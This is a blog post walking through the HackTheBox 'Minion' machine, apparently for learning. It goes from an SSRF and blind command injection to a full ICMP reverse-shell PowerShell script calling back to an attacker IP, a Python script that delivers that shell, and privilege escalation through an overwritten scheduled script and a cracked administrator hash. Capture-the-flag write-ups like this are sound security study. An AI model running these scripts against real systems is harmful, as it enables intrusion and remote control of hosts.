---
layout: post
title:  "HackTheBox - Minion"
date:   2018-03-21 10:35:00 -0800
categories: Pentesting CTF
---
## Service Scanning

Starting with:

<code>nmap -T4 -Pn -oA nmap/initial_scan 10.10.10.57</code>

This scan didn't return any open port. I then executed a wider scan, on all possible TCP ports:

<code>nmap -T4 -Pn -p- -oA nmap/second_scan 10.10.10.57</code>

Only a open TCP port was reported:
{% highlight bash %}
PORT      STATE SERVICE
62696/tcp open  unknown
{% endhighlight %}

Scanning for its version with <code>nmap -sV -p62696 10.10.10.57</code>, showed the follow information:

{% highlight bash %}
PORT      STATE SERVICE VERSION
62696/tcp open  http    Microsoft IIS httpd 8.5
{% endhighlight %}

As this seemed to be an IIS webserver, I fired my browser and went to 10.10.10.57:62696.

## Web Server Enumeration

I saw a website called "Welcome to Minions Fanclub Site!". The visible content didn't seem to be useful, so I decided to have a look at the HTML source code. I then quickly saw what looked to be a base64 value:

{% highlight html %}
<!-- TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu -->
{% endhighlight %}

I go ahead and decode the value and get the plain text value:

{% highlight bash %}
echo -n 'TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu' |base64 -d
Nel mezzo del cammin di nostra vita
mi ritrovai per una selva oscura,
ché la diritta via era smarrita.
{% endhighlight %}

I was able to understand a bit of the Italian, but translated to English:

<pre>
In the middle of the walk of our life
I found myself in a dark forest,
because the straight way was lost.
</pre>

This text didn't tell me anything straight away, so saved it and kept digging for more.

Going to <code>http://10.10.10.57:62696/robots.txt</code>, I learned the directory /backend was disallowed. Going to <code>http://10.10.10.57:62696/backend/</code> only resulted in the HTML response "Instance not running".

To enumerate directories and files, I launched dirb:

<code>dirb http://10.10.10.57:62696 /usr/share/wordlists/dirb/common.txt</code>

Other than the /backend directory, nothing else stood out. I went ahead and this time used gobuster. This way I could increase the number of threads, so it could be faster. I also used a couple of Microsoft Web related extensions:

<code>gobuster -t 50 -u http://10.10.10.57:62696/ -w /usr/share/wordlists/dirb/common.txt -x .asp,.txt,.bak,.sql,.aspx,.mdb,.log,.reg</code>

This time, I got the file test.asp. After going to <code>http://10.10.10.57:62696/test.asp</code>, I get a response saying "Missing Parameter Url [u] in GET request!". At this time, I thought leveraging this to access any internal website. I went ahead and submitted the following request: <code>http://10.10.10.57:62696/test.asp?u=http://127.0.0.1</code>

I got a Site Administration webpage, with a couple of useless links, but with a useful one saying "system commands". This one linked to <code>http://127.0.0.1/cmd.aspx</code>. I then requested <code>http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx</code> and I got a textbox with label "Enter your shell command". There was no submit button, but by pressing enter, the form would be submitted by POST to the same URL cmd.aspx. Because I was running these requests through the test.asp proxy, I couldn't simply just submit the form on the browser, because it would submit it to <code>http://10.10.10.57:62696/cmd.aspx</code> and that wouldn't work. However, I just tried to submit a GET request and it worked! So submitting <code>http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=whoami</code>, would give me a response HTML webpage with Exit Status=0 on its body. This revealed the command was successful, but I was not receiving the output of it. I was facing a blind OS command injection scenario.

## Getting a Foothold

Since this was a Windows machine, my first thought was to run a Powershell command to download and execute a meterpreter shell. Just to test it, I launched a webserver (python -m SimpleHTTPServer) on my attacking box and ran the command <code>powershell -c (new-object System.Net.WebClient).DownloadFile('http://MY_ATTACKER_IP','test_file.txt')</code>. However, I didn't get a connection back to my webserver. I tried a few variants of the command, bypassing the restriction policy (-exec bypass), URL encoding and double encoding, but nothing worked. I was always getting the Exit Status=1, which meant the command failed. I then launched a tcpdump on my machine and ran the ping command through the URL <code>http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=ping -c 3 MY_ATTACKER_IP</code>. I got three ping requests on my tcpdump's output! This meant the machine was only allowing ping network traffic (ICMP Echo Requests and Replies) and it seems I was restricted to use a ICMP shell.

After some research, I quickly found the [icmpsh shell](https://github.com/inquisb/icmpsh) and the Powershell client [Invoke-PowershellShellIcmp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1). I used [this](https://pentestlab.blog/tag/icmpsh/) reference. The icmpsh I would run in my attacker box and the Invoke-PowerShellIcmp.ps1 on the target machine. Because I was not allowed to download any files, my only option was to build the file through the use of echo commands. My plan was once the file was built on the target system, I would launch a powershell command to execute it. After trying a few times manually, using Burp proxy, I decided to automate the process by writing a Python script. Then my nightmare started. I spent several days fighting with URL and shell encodings. I knew that I had to URL encode at least one time the value of parameter xcmd, however, I found out later, the value passed to the echo command, also needed some especial escaping. I used [this](https://sites.google.com/site/opensourceconstriubtions/ettl-martin-1/tutorials/how-to-escape-special-characters-in-windows-batch-files-when-using-echo) reference. The especial characters of the Powershell code of Invoke-PowerShellIcmp.ps1 were breaking the echo command and make the request return the Exit Status=1. I then decided that it would be easier to convert the Invoke-PonvwerShellIcmp.ps1 file to base64 and use that as the value for the echo commands. I also minimized the code in Invoke-PowerShellIcmp.ps1, by removing comments and blank lines. Also, to avoid having to run another Powershell command, I added Invoke-PowerShellIcmp MY_ATTACKER_IP to the end of Invoke-PowerShellIcmp.ps1. The final result was:

{% highlight powershell %}
function Invoke-PowerShellIcmp
{
[CmdletBinding()] Param(
[Parameter(Position = 0, Mandatory = $true)]
[String]
$IPAddress,
[Parameter(Position = 1, Mandatory = $false)]
[Int]
$Delay = 5,
[Parameter(Position = 2, Mandatory = $false)]
[Int]
$BufferSize = 128
)
$ICMPClient = New-Object System.Net.NetworkInformation.Ping
$PingOptions = New-Object System.Net.NetworkInformation.PingOptions
$PingOptions.DontFragment = $True
$sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
$ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
$sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
$ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
while ($true)
{
$sendbytes = ([text.encoding]::ASCII).GetBytes('')
$reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
if ($reply.Buffer)
{
$response = ([text.encoding]::ASCII).GetString($reply.Buffer)
$result = (Invoke-Expression -Command $response 2>&1 | Out-String )
$sendbytes = ([text.encoding]::ASCII).GetBytes($result)
$index = [math]::floor($sendbytes.length/$BufferSize)
$i = 0
if ($sendbytes.length -gt $BufferSize)
{
while ($i -lt $index )
{
$sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
$ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
$i +=1
}
$remainingindex = $sendbytes.Length % $BufferSize
if ($remainingindex -ne 0)
{
$sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
$ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
}
}
else
{
$ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
}
$sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
$ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
}
else
{
Start-Sleep -Seconds $Delay
}
}
}
invoke-powershellicmp MY_ATTACKER_IP
{% endhighlight %}

After running <code>base64 Invoke-PowerShellIcmp.ps1 > Invoke-PowerShellIcmp.b64</code>, I wrote the following Python 2 script that automates the process:

{% highlight python %}
#!/usr/bin/python

import urllib2
import urllib
import re

def send_request(url):
    request = urllib2.Request(url)
    try:
        response = urllib2.urlopen(request)
        content = response.read()
        regex = re.search('Status=(\d+)', content)
        if regex:
            if int(regex.group(1)) != 0:
                print "[%d] => %s" % (response.code,regex.group(1))
                print "\t%s" % url
        else:
            print "[%d]" % response.code
        response.close()
    except urllib2.HTTPError as error:
        print "Failed %s" % error.code
        pass

base64_file = 'Invoke-PowerShellIcmp.b64'
url2 = "http://127.0.0.1/cmd.aspx?xcmd="
url1 = "http://10.10.10.57:62696/test.asp?u="

#############################
print "Building \\temp\s.b64"
i = 0
f = open(base64_file, "r")
for line in f:
    new_line = line.strip()

    if i == 0:
        redir = '>'
    else:
        redir = '>>'

    payload = "echo %s %s \\temp\s.b64" % (new_line,redir)
    send_request(url1 + urllib.quote(url2) + urllib.quote(payload))
    i += 1

f.close()

######################################################
print 'Decoding \\temp\s.b64 and writing \\temp\s.ps1'
send_request(url1 + urllib.quote(url2) + urllib.quote("powershell -c \"[system.text.encoding]::ASCII.getstring([system.convert]::frombase64string((gc \\temp\s.b64)))|out-file \\temp\s.ps1\""))

#############################
print 'Executing \\temp\s.ps1'
send_request(url1 + urllib.quote(url2) + urllib.quote("powershell -c \\temp\s.ps1"))
{% endhighlight %}

<b>Note:</b> For the base64 decoding, I could have used certutil utility as well.

On my attacking box, I launched the icmpsh with <code>icmpsh_m.py MY_ATTACK_IP 10.10.10.57</code> and executed the Python script. After a while I got a Powershell command prompt:

{% highlight bash %}
root@kali:~/icmpsh-master# ./icmpsh_m.py 10.10.17.241 10.10.10.57
Windows PowerShell running as user MINION$ on MINION
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool

PS C:\windows\system32\inetsrv>
{% endhighlight %}

## System Enumeration

I quickly noticed the user iis apppool\defaultapppool was not having all the permissions that I needed. Listing the directory \users, I could see two users: Administrator and decoder.minion. I then found the directory c:\sysadmscripts containing the files c.ps1 and del_logs.bat. Reading the files' content, I learned the c.ps1 Powershell script was most likely being ran each 5 minutes. From the del_logs.bat I saw there was a log file being written at \windows\temp\log.txt. I could see the output written in each 5 minutes. I also noticed that c.ps1 was writable by everyone, so my low privilege user could write into it. I then executed the following command to overwrite the file, so that its next execution would give me the contents of the directory \users\decoder.minion\Desktop:

{% highlight powershell %}
write-output "get-childitem \users\decoder.minion\Desktop | out-file \temp\log.txt" | out-file \sysadmscripts\c.ps1
{% endhighlight %}

After 5 minutes, the content of \temp\log.txt was:

{% highlight powershell %}
PS C:\> cat \temp\log.txt
  Directory: C:\users\decoder.minion\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          9/4/2017   7:19 PM     103297 backup.zip                        
-a---         8/25/2017  11:09 AM         33 user.txt       
{% endhighlight %}

Following the same process, I copied both files to \temp, where I would have permissions to read them:

{% highlight powershell %}
write-output "cat \users\decoder.minion\desktop\user.txt | out-file \temp\user.txt" | out-file \sysadmscripts\c.ps1
{% endhighlight %}

I was able to see the user.txt with <code>cat \temp\user.txt</code>.

I then copied the backup.zip file:

{% highlight powershell %}
write-output "copy-item \users\decoder.minion\desktop\backup.zip -destination \temp\backup.zip" | out-file \sysadmscripts\c.ps1
{% endhighlight %}

I then actually unzipped the backup.zip file using Powershell ([Reference](https://serverfault.com/questions/446884/unzip-file-with-powershell-in-server-2012-core)):

{% highlight powershell %}
[System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null
[System.IO.Compression.ZipFile]::ExtractToDirectory("\temp\backup.zip","\temp")

PS C:\sysadmscripts> get-childitem \temp


    Directory: C:\temp


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          9/4/2017   7:14 PM     386130 secret.exe                        
{% endhighlight %}

Running secret.exe, I just get the current working directory. Nothing special about it. I actually encoded the file in base64 so I could copy paste it and reproduce it on my own machine:

{% highlight powershell %}
$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes('\temp\backup.zip'))
$base64string
{% endhighlight %}

I took a while to print all the base64 content. I then copied all base64 output from the screen and pasted into vi in my attacker box. By decoding this file using the command base64 -d, I was able to get the original secret.exe. Ran strings against it, but nothing stood out.

I then remembered to check the Alternate Data Stream for the backup.zip file and I found a stream called "pass":

{% highlight powershell %}
get-item \temp\backup.zip -stream *

FileName: C:\temp\backup.zip

Stream                   Length
------                   ------
:$DATA                   103297
pass                         34
{% endhighlight %}

Getting the content of the stream, gave me a hash, which looked like a MD5 or most likely a NTLM:

{% highlight powershell %}
cat \temp\backup.zip -stream pass
28a5d1e0c15af9f8fce7db65d75bbf17
{% endhighlight %}

## Own System

Using [Hashkiller](https://hashkiller.co.uk/md5-decrypter.aspx), I was able to crack the hash:

<b>28a5d1e0c15af9f8fce7db65d75bbf17 NTLM : 1234test</b>

This was most certainly the password for the administrator user. I tried the following command to get the Administrator's Desktop directory contents:

{% highlight powershell %}
$username = 'administrator'; $password = '1234test'; $pass = ConvertTo-SecureString -AsPlainText $Password -Force; $cred = New-Object System.Management.Automation.PSCredential $username, $pass; Invoke-Command -ComputerName localhost -credential $cred -ScriptBlock { Get-ChildItem \users\administrator\desktop }
{% endhighlight %}

I used the Invoke-Command and built the PSCredential object using the password. However, as I was running as the low privileged IIS user, this command was not returning nothing. I never got certain of the exact reason, but I presumed the IIS user was not allowed to run Invoke-Command passing other user's credentials. So, I had to change my previous Python script to copy the ICMP shell to \sysadmscripts\c.ps1, so that I could get a shell under decoder user. The change was easy, as instead of copying the Invoke-PowerShellIcmp.ps1 to \temp\s.ps1, I copied to \sysadmscripts\c.ps1. I also commented the execution of the shell as I just wanted it to be triggered by the decoder's scheduled task.

After 5 minutes, I got a shell back under the user decoder. I then proceeded to run the Invoke-command again and this time I got the contents of the Administrator's desktop directory:

{% highlight powershell %}
$username = 'administrator'; $password = '1234test'; $pass = ConvertTo-SecureString -AsPlainText $Password -Force; $cred = New-Object System.Management.Automation.PSCredential $username, $pass; Invoke-Command -ComputerName localhost -credential $cred -ScriptBlock { Get-ChildItem \users\administrator\desktop }

Directory: C:\users\administrator\desktop


Mode                LastWriteTime     Length Name              PSComputerName  
----                -------------     ------ ----              --------------  
-a---         9/26/2017   6:18 AM     386479 root.exe          localhost       
-a---         8/24/2017  12:32 AM         76 root.txt          localhost       
{% endhighlight %}

At that time I thought the challenge was done as the next step would just to get the root.txt content. However, when running the command, I learned the root.txt was not containing what I wanted:

{% highlight powershell %}
$username = 'administrator'; $password = '1234test'; $pass = ConvertTo-SecureString -AsPlainText $Password -Force; $cred = New-Object System.Management.Automation.PSCredential $username, $pass; Invoke-Command -ComputerName localhost -credential $cred -ScriptBlock { cat\users\administrator\desktop\root.txt }

In order to get the flag you have to launch root.exe located in this folder!
{% endhighlight %}

Ok, so I then ran the root.exe executable:

{% highlight powershell %}
$username = 'administrator'; $password = '1234test'; $pass = ConvertTo-SecureString -AsPlainText $Password -Force; $cred = New-Object System.Management.Automation.PSCredential $username, $pass; Invoke-Command -ComputerName localhost -credential $cred -ScriptBlock { \users\administrator\desktop\root.exe }

Are you trying to cheat me?
{% endhighlight %}

Sounded like I would need an extra step. I then remembered about the output of secret.exe that was giving me the current working directory, so I thought if that could be the problem. I changed the command to be in the same directory as root.exe:

<b>Note: The .\ is important.</b>

{% highlight powershell %}
$username = 'administrator'; $password = '1234test'; $pass = ConvertTo-SecureString -AsPlainText $Password -Force; $cred = New-Object System.Management.Automation.PSCredential $username, $pass; Invoke-Command -ComputerName localhost -credential $cred -ScriptBlock { set-location \users\administrator\desktop\; .\root.exe }
{% endhighlight %}

With this I got the root flag. The End.
